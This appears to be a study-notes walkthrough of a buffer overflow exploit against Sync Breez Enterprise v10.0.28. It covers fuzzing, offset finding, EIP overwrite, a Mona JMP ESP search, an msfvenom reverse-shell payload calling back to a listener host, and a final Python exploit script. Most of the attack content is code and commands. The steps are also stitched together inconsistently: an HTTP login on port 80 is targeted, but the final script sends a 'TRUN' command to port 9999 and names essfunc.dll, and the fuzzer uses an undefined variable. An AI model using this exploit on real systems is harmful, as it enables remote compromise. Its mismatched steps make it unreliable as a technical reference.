---
description: Sync Breez Enterprize v10.0.28
---

# Sync Breez Enterprize

**1. Initial Reconnaissance**

*   **Port Scanning:**

    ```bash
    sudo nmap <IP>
    ```

    Identify open ports. In this case, port 80 is open.
*   **Discover Service and Version:** Open Firefox, visit the HTTP page, and find the service version:

    ```
    Sync Breez Enterprise v10.0.28
    ```
* **Discover Communication Method:** Use Wireshark to capture communication between your machine and the server in a local lab.

**2. Fuzzing**

*   **Simulation:** Python script to simulate communication and fuzz the application for potential vulnerabilities.

    ```python
    # Fuzzing Script
    while True:
        payload = "username=" + 'A' * c + "&password=1234"
        request = "POST /login HTTP/1.1\r\n" + "...other headers...\r\n" + payload
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.4", 80))
        s.send(request.encode())
        s.close()
        c += 100
        time.sleep(5)
    ```

**3. Finding the Offset**

*   Generate a pattern using Metasploit's `pattern_create.rb`:

    ```bash
    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
    ```
*   Use this pattern in the script and find the offset:

    ```python
    offset = ""  # Paste the pattern generated by pattern_create.rb
    ```

**4. Overwriting the EIP**

*   Use a payload script with the EIP overwritten:

    ```python
    # Example payload with EIP set to 42424242
    shellcode = "A" * 2003 + "B" * 4 + "\x42\x42\x42\x42" + "C" * (3000 - 2003 - 4)
    ```

**5. Finding Bad Characters**

*   Generate a payload to identify bad characters:

    ```python
    # Example payload for finding bad characters
    badchars = "\x01\x02\x03\x04\x05..."  # List of all possible characters
    ```

**6. Finding the Right Module**

*   Use Mona to find modules and identify JMP ESP addresses:

    ```bash
    !mona modules
    !mona find -s "\xff\xe4" -m essfunc.dll
    ```

**7. Generating Shellcode**

*   Use MSFVenom to generate shellcode:

    ```bash
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f c
    ```

**8. Gaining Root**

* Update the Python script with the generated shellcode and listen for the connection using Netcat.

```python
# Final script
import sys, socket
from time import sleep

overflow = b"\xb8\x5c\x1e\x35\x96\xd9..."  # Generated shellcode
shellcode = b"A" * 2003 + b"B" * 4 + b"\x42\x42\x42\x42" + b"\x90" * 16 + overflow

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.4.104', 9999))
    payload = b"TRUN /.:/" + shellcode
    s.send(payload)
    s.close()
except:
    print("Error connecting to the server")
    sys.exit()
```